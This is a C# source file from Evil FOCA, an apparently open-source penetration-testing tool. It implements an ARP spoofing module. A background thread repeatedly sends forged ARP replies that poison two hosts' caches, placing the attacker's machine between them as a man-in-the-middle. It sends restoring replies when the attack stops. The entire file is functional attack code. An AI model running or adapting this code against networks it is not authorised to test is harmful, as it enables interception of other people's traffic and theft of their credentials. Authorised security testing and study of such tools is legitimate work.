/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpPcap.WinPcap;
using System.Threading;
using System.Net.NetworkInformation;
using PacketDotNet;
using System.Net;
using evilfoca.Data;

namespace evilfoca.Attacks
{
    class ARPSpoofing
    {
        private const int SendPacketEachXSecs = 4;
        private WinPcapDevice device;
        private IPAddress ipLocal;
        private Thread threadAttack;
        private SynchronizedCollection<Data.Attack> attacks;

        public ARPSpoofing(WinPcapDevice device, IPAddress ipV4Local, SynchronizedCollection<Data.Attack> attacks)
        {
            this.device = device;
            this.attacks = attacks;
            this.ipLocal = ipV4Local;
        }

        public void Start()
        {
            threadAttack = new Thread(new ThreadStart(Attack));
            threadAttack.IsBackground = true;
            threadAttack.Start();
        }

        public static EthernetPacket GenerateResponseArpPoison(PhysicalAddress localMac, PhysicalAddress mac1, IPAddress ip1, IPAddress ip2)
        {
            EthernetPacket ethernet;
            ethernet = new EthernetPacket(localMac, mac1, EthernetPacketType.Arp);
            ethernet.PayloadPacket = new ARPPacket(ARPOperation.Response,
                mac1,
                ip1,
                localMac,
                ip2);

            return ethernet;
        }

        private void Attack()
        {
            while (true)
            {
                try
                {
                    PhysicalAddress MACLocal = device.MacAddress;
                    EthernetPacket ethernet;

                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.ARPSpoofing && A.attackStatus == Data.AttackStatus.Attacking))
                    {
                        if (attack is MitmAttack)
                        {
                            ethernet = GenerateResponseArpPoison(device.Interface.MacAddress,
                                    ((MitmAttack)attack).t1.mac,
                                    ((MitmAttack)attack).t1.ip,
                                    ((MitmAttack)attack).t2.ip);
                            Program.CurrentProject.data.SendPacket(ethernet);

                            ethernet = GenerateResponseArpPoison(device.Interface.MacAddress,
                                    ((MitmAttack)attack).t2.mac,
                                    ((MitmAttack)attack).t2.ip,
                                    ((MitmAttack)attack).t1.ip);
                            Program.CurrentProject.data.SendPacket(ethernet);
                        }
                    }

                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.ARPSpoofing && A.attackStatus == Data.AttackStatus.Stopping))
                    {
                        if (attack is MitmAttack)
                        {
                            ethernet = new EthernetPacket(device.Interface.MacAddress, ((MitmAttack)attack).t1.mac, EthernetPacketType.Arp);
                            ethernet.PayloadPacket = new ARPPacket(ARPOperation.Response, ((MitmAttack)attack).t1.mac, ((MitmAttack)attack).t1.ip, ((MitmAttack)attack).t2.mac, ((MitmAttack)attack).t2.ip);
                            Program.CurrentProject.data.SendPacket(ethernet);

                            ethernet = new EthernetPacket(device.Interface.MacAddress, ((MitmAttack)attack).t2.mac, EthernetPacketType.Arp);
                            ethernet.PayloadPacket = new ARPPacket(ARPOperation.Response, ((MitmAttack)attack).t2.mac, ((MitmAttack)attack).t2.ip, ((MitmAttack)attack).t1.mac, ((MitmAttack)attack).t1.ip);
                            Program.CurrentProject.data.SendPacket(ethernet);

                            attack.attackStatus = Data.AttackStatus.Stop;
                        }
                    }

                    Thread.Sleep(SendPacketEachXSecs * 1000);
                }
                catch (ThreadAbortException)
                {
                    return;
                }
                catch
                {
                }
            }
        }

        public void Stop()
        {
            if (threadAttack != null && threadAttack.IsAlive)
            {
                threadAttack.Abort();
                threadAttack = null;
            }
        }
    }
}
